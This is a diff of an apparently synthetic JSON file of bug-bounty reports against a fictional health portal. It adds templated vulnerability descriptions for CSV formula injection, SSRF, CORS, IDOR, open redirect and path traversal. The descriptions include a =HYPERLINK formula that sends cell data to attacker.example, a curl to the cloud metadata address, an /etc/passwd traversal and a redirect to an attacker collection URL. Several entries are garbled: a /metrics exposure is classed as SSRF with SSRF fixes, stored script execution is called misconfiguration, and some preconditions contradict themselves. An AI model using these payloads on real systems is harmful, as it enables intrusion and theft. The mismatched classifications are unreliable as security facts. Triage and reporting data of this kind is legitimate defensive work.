           "offset": "3d 13h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.seefjord-health.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3307,7 +3331,8 @@
           "offset": "4d 16h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.seefjord-health.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3427,7 +3452,8 @@
           "offset": "1d 22h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.seefjord-health.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3530,7 +3556,8 @@
           "offset": "1d 3h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.seefjord-health.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3685,7 +3712,8 @@
           "offset": "8d 9h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.seefjord-health.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3792,7 +3820,8 @@
           "offset": "3d 1h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.seefjord-health.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3969,7 +3998,8 @@
           "offset": "6d 4h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4111,7 +4141,8 @@
           "offset": "6d 18h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4216,7 +4247,8 @@
           "offset": "7d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.seefjord-health.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4368,7 +4400,8 @@
           "offset": "4d 9h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.seefjord-health.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4500,7 +4533,8 @@
           "offset": "22h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.seefjord-health.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4652,7 +4686,8 @@
           "offset": "3d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.seefjord-health.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4760,7 +4795,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.seefjord-health.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4900,7 +4936,8 @@
           "offset": "10h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.seefjord-health.foo/export`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5003,7 +5040,8 @@
           "offset": "4d 17h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.seefjord-health.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5102,7 +5140,8 @@
           "offset": "4d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.seefjord-health.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5246,7 +5285,8 @@
           "offset": "3d 7h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.seefjord-health.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5370,7 +5410,8 @@
           "offset": "7d 3h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.seefjord-health.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5486,7 +5527,8 @@
           "offset": "1d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.seefjord-health.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5645,7 +5687,8 @@
           "offset": "7d 5h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.seefjord-health.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5811,7 +5854,8 @@
           "offset": "7d 8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.seefjord-health.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5931,7 +5975,8 @@
           "offset": "2d 11h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.seefjord-health.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6111,7 +6156,8 @@
           "offset": "7d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.seefjord-health.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6222,7 +6268,8 @@
           "offset": "1d 12h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.seefjord-health.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6313,7 +6360,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.seefjord-health.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6442,7 +6490,8 @@
           "offset": "1d 14h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6602,7 +6651,8 @@
           "offset": "7d 1h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.seefjord-health.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6740,7 +6790,8 @@
           "offset": "1d 15h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6867,7 +6918,8 @@
           "offset": "3d 1h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.seefjord-health.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6980,7 +7032,8 @@
           "offset": "3d 15h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7123,7 +7176,8 @@
           "offset": "8d 15h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.seefjord-health.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7230,7 +7284,8 @@
           "offset": "3d 19h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
